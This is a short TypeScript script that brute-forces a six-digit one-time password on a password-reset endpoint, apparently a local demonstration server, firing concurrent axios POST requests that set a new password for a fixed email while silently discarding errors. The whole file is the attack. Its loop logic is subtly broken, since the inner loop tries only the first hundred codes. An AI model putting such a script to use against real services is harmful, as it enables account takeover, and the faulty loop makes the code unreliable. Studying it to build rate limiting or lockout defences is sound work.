import axios from "axios";
async function hit(otp:string){
    let data = JSON.stringify({
        "email": "ash@gmail.com",
        "otp": otp,
        "newPassword": "913325"
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/password-reset',
        headers: { 
          'Content-Type': 'application/json'
        },
        data : data
      };
      try{
          await axios.request(config);
      }
      catch(e){
      
      }
}

async function main(){
    const promise = []
    for(let i=0;i<=999999;i+=100){
        console.log(i);
        for(let j=i;j<100;j++){
            promise.push(hit((i + j).toString()))
        }
    }
    await Promise.all(promise);
}

main();
